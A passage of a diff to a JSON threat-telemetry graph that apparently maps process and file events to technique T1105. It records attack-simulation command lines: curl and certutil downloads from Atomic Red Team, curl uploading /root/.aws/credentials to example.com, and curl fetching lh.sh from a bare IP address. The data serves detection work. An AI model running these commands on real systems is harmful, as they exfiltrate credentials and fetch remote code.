+        "parent_process_id": "Process:{ec2d99e9-8852-61b3-785d-5260cd550000}:1",
+        "event_id": "3",
+        "id": "network:45.155.205.233:5874:tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "45.155.205.233",
+        "name": "45.155.205.233"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-F32A-616E-063B-01000000F101}:1",
+      "label": "curl.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-F32A-616E-063B-01000000F101}",
+        "pid": "5456",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "%system32%\\curl.exe  -k https:\\github.com\\redcanaryco\\atomic-red-team\\raw\\058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e\\atomics\\t1218.010\\bin\\allthethingsx64.dll --output %userprofile%\\music\\allthethingsx64.dll",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "1037f4477d4f26fb6eaf7db583d14b475c80c8528c6fcd250b65a276c4480150",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-F32A-616E-063B-01000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "curl.exe",
+        "name": "curl.exe",
+        "parent_process_id": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:1e1142cef1f05bc99765a570ef2232528c20dc9492224f4ce842010205a0cb7e:7",
+      "label": "bcryptprimitives.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\bcryptprimitives.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=8AAF6E1B14B9210052FFF90E25926D63,SHA256=F2120C8E63EA94F8618B31319A534731C16D8FDD58B0E1E70217D72A39D78353",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:1e1142cef1f05bc99765a570ef2232528c20dc9492224f4ce842010205a0cb7e:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "bcryptprimitives.dll",
+        "name": "bcryptprimitives.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:10",
+      "label": "bitsadmin.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "bitsadmin.exe",
+        "guid": "{896A638B-B3E4-605B-6F69-00000000AE01}",
+        "pid": "932",
+        "image_path": "%system32%\\bitsadmin.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1000 for bitsadmin.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "5553a176f40565cdf3d73f0928734b9400ec62f0fd9fe0266d648e413401f1b9",
+        "parent_process_id": "Process:{896A638B-B5CB-6058-1600-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{896A638B-B3E4-605B-6F69-00000000AE01}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "bitsadmin.exe",
+        "name": "bitsadmin.exe"
+      }
+    },
+    {
+      "id": "File:fc0ef9da2f5aafc20ee58a746df609b9abda1acfe9ff986ef9da07354d16cd30:7",
+      "label": "rasadhlp.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\rasadhlp.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=FAE8D0480BDD905EEA453D3A57C8D5C6,SHA256=C1531223B8201B344A6A6474CB2D9B8A8C632250A3A6F472EC5E2D7D28ADD94C",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:fc0ef9da2f5aafc20ee58a746df609b9abda1acfe9ff986ef9da07354d16cd30:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "rasadhlp.dll",
+        "name": "rasadhlp.dll"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-F32A-616E-073B-01000000F101}:1",
+      "label": "curl.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-F32A-616E-073B-01000000F101}",
+        "pid": "3804",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "%system32%\\curl.exe  -k https:\\github.com\\redcanaryco\\atomic-red-team\\raw\\058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e\\atomics\\t1218.010\\bin\\allthethingsx64.dll -o %programdata%\\allthethingsx64.dll",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "6a37bc9354e77a826a74aa4974e0c41759f8c18108d111863c4ff58ca5861878",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-F32A-616E-073B-01000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "curl.exe",
+        "name": "curl.exe",
+        "parent_process_id": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-F32A-616E-053B-01000000F101}:1",
+      "label": "the curl executable",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-F32A-616E-053B-01000000F101}",
+        "pid": "6316",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "%system32%\\curl.exe  -k https:\\github.com\\redcanaryco\\atomic-red-team\\raw\\058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e\\atomics\\t1218.010\\bin\\allthethingsx64.dll -o %userprofile%\\music\\allthethingsx64.dll",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "2f73025c35730d6192fa0279ebdb0fe764464ec6759157657fbff4e98c1ae4ef",
+        "parent_process_id": "Process:{8B6011A9-F329-616E-043B-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-F32A-616E-053B-01000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "the curl executable",
+        "name": "the curl executable"
+      }
+    },
+    {
+      "id": "File:f5265318b5f1148ffbbe24ca0307cef02f129ded08cbc18fb05497489ec1f5b5:7",
+      "label": "sspicli.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\sspicli.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=5061339CE61C0B32DB8F51A95E3B2422,SHA256=60558CA374334D4C6BBAD475921538C14A9FF3422893348A0503C1F33015FD25",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:f5265318b5f1148ffbbe24ca0307cef02f129ded08cbc18fb05497489ec1f5b5:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "sspicli.dll",
+        "name": "sspicli.dll"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-E58D-618B-A9A5-04000000F101}:1",
+      "label": "the curl executable",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-E58D-618B-A9A5-04000000F101}",
+        "pid": "6308",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "curl.exe  -f c:\\temp\\atomictestfile.txt www.example.com",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "98e966ea0871e892b6e2d09fed90c98e51bcb0ef68d814e60fadcdcfe06748d5",
+        "parent_process_id": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-E58D-618B-A9A5-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "the curl executable",
+        "name": "the curl executable"
+      }
+    },
+    {
+      "id": "File:7fb66dd0e5d2c34be98c06a87e5227258fe8f1b20f8186a695cf39e707f77c28:7",
+      "label": "imm32.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\imm32.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=E1024CF2E35DD3467F52BC83F7FEDA3F,SHA256=59C87761AD509BD096C2F35257C2370FB94B95160CB63FB9E66DFD8210AB002A",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:7fb66dd0e5d2c34be98c06a87e5227258fe8f1b20f8186a695cf39e707f77c28:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "imm32.dll",
+        "name": "imm32.dll"
+      }
+    },
+    {
+      "id": "File:4d40a8b621a06f30abe4a4ecfd9129953992a18dfb481163b1bf9d434ee521dc:7",
+      "label": "ucrtbase.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\ucrtbase.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=9804D130E8E7178738C2B9808091B427,SHA256=6053B7CC85846F15094475116A8C57BA89FE99FDD1978C54E8A7E2114E318FE3",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:4d40a8b621a06f30abe4a4ecfd9129953992a18dfb481163b1bf9d434ee521dc:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "ucrtbase.dll",
+        "name": "ucrtbase.dll"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E2-605B-6969-00000000AE01}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{896A638B-B3E2-605B-6969-00000000AE01}",
+        "pid": "7096",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"cmd \\c certutil -urlcache -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt atomic-license.txt",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "78598d2fecfcf7b7ad2e67316ac53aa43228de04c55b5c2ccd8e9ffe7f3cff3b",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3E2-605B-6969-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{896A638B-FBAD-6058-BE11-00000000AE01}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:9645a0699b090a2c814057f9add85dd0473c7d36ac237d47ac9d286dc2555430:7",
+      "label": "msasn1.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%system32%\\msasn1.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "MD5=299464D218A27B56684B715365D149FE,SHA256=2BFE4014E06552A9D4201EF9D1C605694AAF2B7B811265EFD91FC6D1C2D48242",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "7",
+        "id": "File:9645a0699b090a2c814057f9add85dd0473c7d36ac237d47ac9d286dc2555430:7",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "msasn1.dll",
+        "name": "msasn1.dll"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-E592-618B-AEA5-04000000F101}:1",
+      "label": "the curl executable",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-E592-618B-AEA5-04000000F101}",
+        "pid": "3440",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "curl  --help",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "83ab696a741ffc57345f36406eee123eec4e58a997466a0356c00671065e27ba",
+        "parent_process_id": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-E592-618B-AEA5-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "the curl executable",
+        "name": "the curl executable"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-E695-618B-D0A5-04000000F101}:1",
+      "label": "windows command processor",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{8B6011A9-E695-618B-D0A5-04000000F101}",
+        "pid": "7496",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"echo \"this is an atomic test file\" c:\\temp\\atomictestfile.txt & %windir%\\system32\\curl.exe -t c:\\temp\\atomictestfile.txt www.example.com & c:\\windows\\system32\\curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com & c:\\windows\\system32\\curl.exe -d c:\\temp\\atomictestfile.txt www.example.com & c:\\windows\\system32\\curl.exe --data c:\\temp\\atomictestfile.txt www.example.com",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
+        "command_hash": "b8347bbe78454158eadadc02c849fb5fa84affe61eca77a34a48ca84ca932672",
+        "parent_process_id": "Process:{8B6011A9-C6FA-616E-9B35-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-E695-618B-D0A5-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows command processor",
+        "name": "windows command processor"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-d3ea-62e3-782d-328196550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-d3ea-62e3-782d-328196550000}",
+        "pid": "22917",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -f userfile=@\\root\\.aws\\credentials http:\\example.com",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "3b79c98e6f87e856e55f7585f86253ff85a76925efc3d6dcfe91b36401d76e61",
+        "parent_process_id": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+        "user_id": "user:\\ubuntu",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-d3ea-62e3-782d-328196550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{00000000-0000-0000-0000-000000000000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{00000000-0000-0000-0000-000000000000}",
+        "pid": "19600",
+        "image_path": "-",
+        "command_line": "-",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{00000000-0000-0000-0000-000000000000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+      "label": "bash",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{ec2d99e9-8796-61b3-08c4-2a1dfd550000}",
+        "pid": "7371",
+        "image_path": "bin\\bash",
+        "command_line": "bash",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{ec2d99e9-8796-61b3-08c4-2a1dfd550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "bash",
+        "name": "bash"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-0f77-62e4-781d-5c1a9a550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-0f77-62e4-781d-5c1a9a550000}",
+        "pid": "23541",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -so https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1059.004\\src\\echo-art-fish.sh",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "42b2391a9d25d54d06edeb6aac60b914c5ca506dc97ad26d98a19eef40a906bb",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-0f77-62e4-781d-5c1a9a550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+      "label": "lsass.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{896A638B-B5C8-6058-0B00-00000000AE01}",
+        "pid": "612",
+        "image_path": "%system32%\\lsass.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "lsass.exe",
+        "name": "lsass.exe"
+      }
+    },
     {
       "id": "Technique:T1105",
       "label": "T1105",
@@ -34,17 +963,3361 @@
         "type": "Technique",
         "entity_class": "Technique"
       }
+    },
+    {
+      "id": "Process:{ec2d99e9-a7d4-61b4-787d-a086d1550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec2d99e9-a7d4-61b4-787d-a086d1550000}",
+        "pid": "13758",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -s 80.71.158.12\\lh.sh",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "321ea287ebe6f5eb4786ecdcb174ad15c8527bc85ee1ab5c8f207a137468af78",
+        "parent_process_id": "Process:{ec2d99e9-a6ec-61b4-0854-8e1210560000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec2d99e9-a7d4-61b4-787d-a086d1550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-0fdb-62e4-782d-e0fe87550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-0fdb-62e4-782d-e0fe87550000}",
+        "pid": "23596",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -so https:\\gist.githubusercontent.com\\mhaggis\\f3c6091d189ac6ed73b55a7c0e7f4d68\\raw\\e0f1faca6487bc92fa5e56615aa91335090db47a\\test.sh",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "029c3aac1471ff7f160e1c76c0ff65a981c782637ee784c78a9375e80715b8eb",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-0fdb-62e4-782d-e0fe87550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E7-605B-7669-00000000AE01}:1",
+      "label": "microsoft malware protection command line utility",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "microsoft malware protection command line utility",
+        "guid": "{896A638B-B3E7-605B-7669-00000000AE01}",
+        "pid": "6356",
+        "image_path": "%programdata%\\microsoft\\windows defender\\platform\\4.18.2010.7-0\\mpcmdrun.exe",
+        "command_line": "mpcmdrun.exe  -downloadfile -url https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt -path %temp%\\2\\atomic-license.txt",
+        "original_file_name": "mpcmdrun.exe",
+        "image_hash": "MD5=EEC27FC7FA4E054BA7108573F9C55B31,SHA256=9D4EF8248AA778475FC864001208FB64FF22B94C0268FB8E945ABB176353E26E,IMPHASH=11272291EEE614C53BFCC9CA857AFAA9",
+        "command_hash": "a25763b4e8fa0c7a31c16fa21fa78b6165b5c7c05887ac8c45e623e4009821f0",
+        "parent_process_id": "Process:{896A638B-B3E7-605B-7569-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{896A638B-B3E7-605B-7669-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "microsoft malware protection command line utility",
+        "name": "microsoft malware protection command line utility"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+      "label": "bash",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{ec28c72e-caa1-62e3-48c4-b8cb06560000}",
+        "pid": "22840",
+        "image_path": "bin\\bash",
+        "command_line": "-bash",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{ec28c72e-caa1-62e3-48c4-b8cb06560000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "bash",
+        "name": "bash"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-0d00-62e4-784d-26e689550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-0d00-62e4-784d-26e689550000}",
+        "pid": "23356",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -so https:\\gist.githubusercontent.com\\mhaggis\\b7fe00e3f4b12de4dc302ad3b0a9b26f\\raw\\5f6b35cce55d038403bbc38272f45853ea42c390\\test.mof \\tmp\\test.mof",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "cd090c45479f19bf08136d2a8ce0341def3eb033c72de3f69fb532da58a8b82d",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-0d00-62e4-784d-26e689550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B3E4-605B-6D69-00000000AE01}:10",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B3E4-605B-6D69-00000000AE01}",
+        "pid": "6268",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1000 for certutil.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "d5d37ed63f00c2be58b80df46c12cc9556c9511130e23d93be1be9e5f961c2b9",
+        "parent_process_id": "Process:{896A638B-B5C8-6058-0B00-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{896A638B-B3E4-605B-6D69-00000000AE01}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Process:{8B6011A9-E4F2-618B-96A5-04000000F101}:1",
+      "label": "the curl executable",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "the curl executable",
+        "guid": "{8B6011A9-E4F2-618B-96A5-04000000F101}",
+        "pid": "7664",
+        "image_path": "%system32%\\curl.exe",
+        "command_line": "curl.exe  -d c:\\temp\\atomictestfile.txt #{remote_destination}",
+        "original_file_name": "curl.exe",
+        "image_hash": "MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528",
+        "command_hash": "0224ab6dc5cf179eb8c62253ce786824d018f59d0f24a41a1ee455ce2aaa189d",
+        "parent_process_id": "Process:{8B6011A9-92C8-616D-4E11-01000000F101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{8B6011A9-E4F2-618B-96A5-04000000F101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "the curl executable",
+        "name": "the curl executable"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B403-605B-8169-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B403-605B-8169-00000000AE01}",
+        "pid": "6800",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "%system32%\\certutil.exe\" —verifyctl -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "e283aef6bd0ff45d3e6f25d97fbb0868be66d7f12d1c7b0b78aede1c15e18fda",
+        "parent_process_id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{896A638B-B403-605B-8169-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Process:{ec28c72e-0c88-62e4-78cd-bc06f4550000}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{ec28c72e-0c88-62e4-78cd-bc06f4550000}",
+        "pid": "23333",
+        "image_path": "usr\\bin\\curl",
+        "command_line": "curl -so https:\\gist.githubusercontent.com\\mhaggis\\b7fe00e3f4b12de4dc302ad3b0a9b26f\\raw\\5f6b35cce55d038403bbc38272f45853ea42c390\\test.mof",
+        "original_file_name": "-",
+        "image_hash": "-",
+        "command_hash": "1e7a1ae9bdb589c022616ff7c8ba35857f17ce9792c50362d6c94ea179738c82",
+        "parent_process_id": "Process:{ec28c72e-edb1-62e3-4884-14ef6f550000}:1",
+        "user_id": "user:\\root",
+        "event_id": "1",
+        "id": "Process:{ec28c72e-0c88-62e4-78cd-bc06f4550000}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{896A638B-B407-605B-8369-00000000AE01}:1",
+      "label": "certutil.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "certutil.exe",
+        "guid": "{896A638B-B407-605B-8369-00000000AE01}",
+        "pid": "1220",
+        "image_path": "%system32%\\certutil.exe",
+        "command_line": "%system32%\\certutil.exe\" -verifyctl -split -f https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\license.txt",
+        "original_file_name": "certutil.exe",
+        "image_hash": "MD5=BF7CEA72AE186A10239F830F93492A73,SHA256=A50DFE408565C2BB011D013AC43E616B2A595B1D06EB9B083F519672732498DA,IMPHASH=442218E88D4D6AA0BE3165DD7B20A4C4",
+        "command_hash": "9695d58696776b8eba71909b199ff47a28754ef5c19c66d70194ad0437d633ba",
+        "parent_process_id": "Process:{896A638B-B3F6-605B-7769-00000000AE01}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{896A638B-B407-605B-8369-00000000AE01}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "certutil.exe",
+        "name": "certutil.exe"
+      }
+    },
+    {
+      "id": "Registry:91a5257771cc01f0890f539d25d891562f40d420bb2931551ba5793d146f9cd2:12",
+      "label": "Parameters",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKLM\\SYSTEM\\CURRENTCONTROLSET\\SERVICES\\TCPIP",
+        "value_name": "Parameters",
+        "value_data": "CreateKey",
+        "source_image_path": "%system32%\\curl.exe",
+        "parent_process_id": "Process:{8B6011A9-F32A-616E-083B-01000000F101}:1",
+        "event_id": "12",
+        "id": "Registry:91a5257771cc01f0890f539d25d891562f40d420bb2931551ba5793d146f9cd2:12",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "Parameters",
+        "name": "Parameters"
+      }
+    },
+    {
+      "id": "File:2ffcceaca489b62f08144fe6ae8d9c9875b00895f39dd257b36fb40d6eb80988:11",
+      "label": "allthethingsx64.dll",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%programdata%\\allthethingsx64.dll",
+        "source_image_path": "%system32%\\curl.exe",
+        "content_hash": "",
